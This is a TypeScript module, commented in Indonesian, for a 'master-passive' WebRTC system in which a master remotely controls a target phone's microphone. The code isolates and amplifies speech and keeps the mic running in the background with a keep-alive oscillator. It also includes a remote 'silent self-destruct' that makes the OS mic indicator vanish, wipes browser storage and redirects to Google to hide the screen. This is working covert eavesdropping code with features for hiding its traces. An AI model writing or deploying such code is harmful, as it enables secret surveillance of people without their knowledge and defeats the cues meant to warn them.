/**
 * S.I.G.M.A DISKOMLEKAU — Tactical Master-Passive Client WebRTC Control Module
 * Pure Web API / Vanilla JS compatible implementation for:
 * 1. Vocal Isolation Web Audio API Pipeline (300 Hz – 3400 Hz Bandpass / Highpass + Lowpass)
 * 2. Standby-Safe Remote Mute/Unmute (GainNode 0 / 3.0 + track.enabled tanpa pernah track.stop() / suspend)
 * 3. Remote Emergency Wipe (Silent Self-Destruct)
 */

export type RemoteCommandType = 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE';

export interface RemoteCommandPacket {
  type: RemoteCommandType;
  value?: number | boolean;
  timestamp: number;
}

export interface DataChannelLike {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  send: (data: any) => void;
  readyState?: RTCDataChannelState;
  open?: boolean;
  onmessage?: ((event: MessageEvent) => void) | null;
  on?: (event: 'data', cb: (data: unknown) => void) => unknown;
}

/**
 * ============================================================================
 * 1. MASTER (AKTIF): Pengiriman Komando Jarak Jauh via WebRTC DataChannel
 * ============================================================================
 */

export function sendCommand(
  dataChannel: DataChannelLike | null | undefined,
  commandType: RemoteCommandType,
  value?: number | boolean
): boolean {
  if (!dataChannel) return false;

  const isNativeOpen = dataChannel.readyState === 'open';
  const isPeerJsOpen = dataChannel.open === true;

  if (!isNativeOpen && !isPeerJsOpen) {
    return false;
  }

  const packet: RemoteCommandPacket = {
    type: commandType,
    value,
    timestamp: Date.now(),
  };

  try {
    if (typeof dataChannel.readyState === 'string') {
      dataChannel.send(JSON.stringify(packet));
    } else {
      dataChannel.send(packet);
    }
    return true;
  } catch {
    return false;
  }
}

/**
 * Memicu sinyal EMERGENCY_WIPE (Tombol Bunuh Diri Jarak Jauh) ke Klien target.
 */
export function triggerEmergencyWipe(
  dataChannel: DataChannelLike | null | undefined
): boolean {
  return sendCommand(dataChannel, 'EMERGENCY_WIPE', true);
}

/**
 * ============================================================================
 * 2. KLIEN (PASIF): Vocal Isolation Filter (300Hz–3400Hz) & Standby-Safe Mute/Unmute
 * ============================================================================
 */

export interface PassiveAudioPipeline {
  audioContext: AudioContext;
  gainNode: GainNode;
  highpassFilter: BiquadFilterNode;
  lowpassFilter: BiquadFilterNode;
  vocalPresenceFilter: BiquadFilterNode;
  rawStream: MediaStream;
  processedStream: MediaStream;
  setRemoteGain: (gainValue: number) => void;
  setRemoteMute: (muted: boolean) => void;
  getState: () => { gain: number; muted: boolean };
  bindDataChannel: (channel: DataChannelLike) => void;
}

/**
 * Mengeksekusi penghapusan jejak darurat (Silent Self-Destruct) HANYA saat menerima EMERGENCY_WIPE:
 * a. Mematikan seluruh track audio/video (`track.stop()`) agar indikator mic di OS HP hilang seketika.
 * b. Menutup seluruh RTCPeerConnection, DataChannel, dan WebSocket secara sepihak.
 * c. Membersihkan seluruh localStorage & sessionStorage.
 * d. Melakukan redirect `window.location.replace()` ke Google untuk menyamarkan layar.
 */
export function silentSelfDestruct(options?: {
  streams?: (MediaStream | null | undefined)[];
  peerConnections?: (RTCPeerConnection | { close: () => void } | null | undefined)[];
  peerInstance?: { destroy: () => void } | null;
  audioContext?: AudioContext | null;
  redirectUrl?: string;
}): void {
  try {
    if (options?.streams) {
      options.streams.forEach((stream) => {
        if (stream) {
          stream.getTracks().forEach((track) => {
            try {
              track.enabled = false;
              track.stop();
            } catch {}
          });
        }
      });
    }

    if (options?.audioContext && options.audioContext.state !== 'closed') {
      options.audioContext.close().catch(() => {});
    }

    if (options?.peerConnections) {
      options.peerConnections.forEach((pc) => {
        if (pc) {
          try {
            pc.close();
          } catch {}
        }
      });
    }

    if (options?.peerInstance) {
      try {
        options.peerInstance.destroy();
      } catch {}
    }

    try {
      localStorage.clear();
    } catch {}
    try {
      sessionStorage.clear();
    } catch {}
  } finally {
    const targetUrl = options?.redirectUrl || 'https://www.google.com';
    window.location.replace(targetUrl);
  }
}

/**
 * Membuat pipeline Web Audio API untuk Klien dengan fitur:
 * 1. VOCAL ISOLATION (300 Hz – 3400 Hz):
 *    - Highpass BiquadFilterNode (300 Hz): memotong suara gemuruh mesin, angin, AC, & getaran rendah.
 *    - Lowpass BiquadFilterNode (3400 Hz): memotong suara desis frekuensi tinggi (hiss/statis).
 *    - Peaking BiquadFilterNode (1800 Hz, +4.5 dB): memperjelas artikulasi vokal manusia.
 * 2. STANDBY-SAFE MUTE / UNMUTE:
 *    - JANGAN PERNAH memanggil `track.stop()` atau `audioContext.suspend()` saat MUTE!
 *    - Hardware mic (`rawMediaStream`) selalu dijaga tetap menyala (`enabled = true`) di background
 *      agar OS Android tidak pernah memutus akses hardware karena timeout hemat baterai.
 *    - Saat MUTE: `gainNode.gain.value = 0` dan `processedStream` track `enabled = false`.
 *    - Saat UNMUTE: `gainNode.gain.value = currentGain` (default `3.0`) dan semua track `enabled = true`.
 */
export function setupPassiveAudio(
  rawMediaStream: MediaStream,
  initialDataChannel?: DataChannelLike | null,
  cleanupRefs?: {
    getExtraStreams?: () => (MediaStream | null | undefined)[];
    getPeerConnections?: () => (RTCPeerConnection | { close: () => void } | null | undefined)[];
    getPeerInstance?: () => { destroy: () => void } | null;
  },
  onStateUpdated?: (state: { gain: number; muted: boolean }) => void
): PassiveAudioPipeline {
  const AudioCtx =
    window.AudioContext ||
    (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;

  const audioContext = new AudioCtx();
  const sourceNode = audioContext.createMediaStreamSource(rawMediaStream);

  // 1. Filter Highpass 300 Hz: Memotong frekuensi di bawah 300 Hz (gemuruh mesin/angin)
  const highpassFilter = audioContext.createBiquadFilter();
  highpassFilter.type = 'highpass';
  highpassFilter.frequency.value = 300;
  highpassFilter.Q.value = 0.707;

  // 2. Filter Lowpass 3400 Hz: Memotong frekuensi di atas 3400 Hz (suara desis tinggi)
  const lowpassFilter = audioContext.createBiquadFilter();
  lowpassFilter.type = 'lowpass';
  lowpassFilter.frequency.value = 3400;
  lowpassFilter.Q.value = 0.707;

  // 3. Filter Peaking Vokal (1800 Hz): Menonjolkan kejelasan frekuensi suara manusia
  const vocalPresenceFilter = audioContext.createBiquadFilter();
  vocalPresenceFilter.type = 'peaking';
  vocalPresenceFilter.frequency.value = 1800;
  vocalPresenceFilter.Q.value = 1.0;
  vocalPresenceFilter.gain.value = 4.5;

  // 4. GainNode Utama: Default 3.0 (Unmute) dan 0.0 (Mute) sesuai spesifikasi
  const gainNode = audioContext.createGain();
  const destinationNode = audioContext.createMediaStreamDestination();

  // Default Gain saat Unmute adalah 3.0 agar suara vokal manusia lebih besar & dominan
  let currentGain = 3.0;
  let isMuted = false;

  gainNode.gain.value = currentGain;

  // Rangkai graph Web Audio API:
  // Mic Source -> Highpass (300Hz) -> Lowpass (3400Hz) -> Vocal Presence -> GainNode -> Destination
  sourceNode.connect(highpassFilter);
  highpassFilter.connect(lowpassFilter);
  lowpassFilter.connect(vocalPresenceFilter);
  vocalPresenceFilter.connect(gainNode);
  gainNode.connect(destinationNode);

  // 5. Sub-audible Keep-Alive Oscillator (mencegah OS Android men-suspend AudioContext saat MUTE lama)
  try {
    const keepAliveOsc = audioContext.createOscillator();
    const keepAliveGain = audioContext.createGain();
    keepAliveOsc.frequency.value = 20; // 20 Hz sub-audible
    keepAliveGain.gain.value = 0.00001; // -100 dB (tidak terdengar, menjaga pipeline DSP tetap aktif)
    keepAliveOsc.connect(keepAliveGain);
    keepAliveGain.connect(destinationNode);
    keepAliveOsc.start();
  } catch {}

  const applyGainAndMuteState = () => {
    // Pastikan AudioContext TIDAK PERNAH suspended, terutama saat menerima perintah UNMUTE
    if (audioContext.state === 'suspended') {
      audioContext.resume().catch(() => {});
    }

    // JANGAN PERNAH memanggil track.stop()!
    // Biarkan rawMediaStream hardware tetap hidup di background (standby)
    rawMediaStream.getAudioTracks().forEach((track) => {
      // Pastikan hardware track selalu enabled = !isMuted (atau standby) tanpa pernah di-stop
      track.enabled = !isMuted;
    });

    // Atur GainNode: 0 saat Mute, currentGain (default 3.0) saat Unmute
    const targetGain = isMuted ? 0 : currentGain;
    try {
      gainNode.gain.cancelScheduledValues(audioContext.currentTime);
      gainNode.gain.setValueAtTime(targetGain, audioContext.currentTime);
      gainNode.gain.value = targetGain;
    } catch {
      gainNode.gain.value = targetGain;
    }

    // Pastikan track pada processedStream juga di-enable kembali saat Unmute
    destinationNode.stream.getAudioTracks().forEach((track) => {
      track.enabled = !isMuted;
    });

    if (onStateUpdated) {
      onStateUpdated({ gain: currentGain, muted: isMuted });
    }
  };

  const setRemoteGain = (gainValue: number) => {
    const numeric = Number(gainValue);
    // Jika diberi nilai > 0, simpan sebagai currentGain; jika 0, anggap minimal 3.0 saat unmute
    const clamped = Math.max(0.5, Math.min(10, numeric > 0 ? numeric : 3.0));
    currentGain = clamped;
    applyGainAndMuteState();
  };

  const setRemoteMute = (muted: boolean) => {
    isMuted = Boolean(muted);
    // Saat di-UNMUTE, pastikan currentGain minimal bernilai 3.0 jika sebelumnya belum diset
    if (!isMuted && currentGain <= 0) {
      currentGain = 3.0;
    }
    applyGainAndMuteState();
  };

  const handleIncomingCommand = (rawPayload: unknown) => {
    let packet: RemoteCommandPacket | null = null;

    if (typeof rawPayload === 'string') {
      try {
        packet = JSON.parse(rawPayload) as RemoteCommandPacket;
      } catch {
        return;
      }
    } else if (rawPayload && typeof rawPayload === 'object') {
      packet = rawPayload as RemoteCommandPacket;
    }

    if (!packet || !packet.type) return;

    switch (packet.type) {
      case 'SET_GAIN': {
        if (typeof packet.value === 'number') {
          setRemoteGain(packet.value);
        }
        break;
      }
      case 'SET_MUTE': {
        setRemoteMute(Boolean(packet.value));
        break;
      }
      case 'EMERGENCY_WIPE': {
        silentSelfDestruct({
          streams: [
            rawMediaStream,
            destinationNode.stream,
            ...(cleanupRefs?.getExtraStreams ? cleanupRefs.getExtraStreams() : []),
          ],
          peerConnections: cleanupRefs?.getPeerConnections
            ? cleanupRefs.getPeerConnections()
            : [],
          peerInstance: cleanupRefs?.getPeerInstance
            ? cleanupRefs.getPeerInstance()
            : null,
          audioContext,
          redirectUrl: 'https://www.google.com',
        });
        break;
      }
    }
  };

  const bindDataChannel = (channel: DataChannelLike) => {
    if (!channel) return;

    const chanWithFlag = channel as DataChannelLike & {
      __sigmaPassiveBound?: boolean;
    };
    if (chanWithFlag.__sigmaPassiveBound) return;
    chanWithFlag.__sigmaPassiveBound = true;

    // 1. Standar WebRTC RTCDataChannel.onmessage
    if ('onmessage' in channel) {
      const prevOnMessage = channel.onmessage;
      channel.onmessage = (event: MessageEvent) => {
        if (prevOnMessage) prevOnMessage(event);
        handleIncomingCommand(event.data);
      };
    }

    // 2. PeerJS DataConnection.on('data')
    if (typeof channel.on === 'function') {
      channel.on('data', (data: unknown) => {
        handleIncomingCommand(data);
      });
    }
  };

  if (initialDataChannel) {
    bindDataChannel(initialDataChannel);
  }

  return {
    audioContext,
    gainNode,
    highpassFilter,
    lowpassFilter,
    vocalPresenceFilter,
    rawStream: rawMediaStream,
    processedStream: destinationNode.stream,
    setRemoteGain,
    setRemoteMute,
    getState: () => ({ gain: currentGain, muted: isMuted }),
    bindDataChannel,
  };
}
